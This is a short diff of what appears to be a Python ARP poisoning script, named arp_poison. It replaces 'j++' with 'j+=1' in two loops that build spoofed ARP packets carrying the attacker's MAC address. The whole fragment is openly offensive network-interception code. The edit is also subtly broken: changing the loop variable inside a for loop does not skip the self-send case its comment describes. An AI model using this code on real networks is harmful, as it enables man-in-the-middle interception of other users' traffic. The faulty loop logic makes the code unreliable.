@@ -58,7 +58,7 @@ def arp_poison():
         for j in nrOfHosts:
             # No need to send ARP package to itself.
             if (i==j):
-                j++
+                j+=1
             arp = Ether() / ARP()
             arp[Ether].src = macAttacker
             arp[ARP].hwsrc = macAttacker
@@ -77,7 +77,7 @@ def arp_poison():
             for j in nrOfHosts:
                 # No need to send ARP package to itself.
                 if (i==j):
-                    j++
+                    j+=1
                 arp = Ether() / ARP()
                 arp[Ether].src = macAttacker
                 arp[ARP].hwsrc = macAttacker
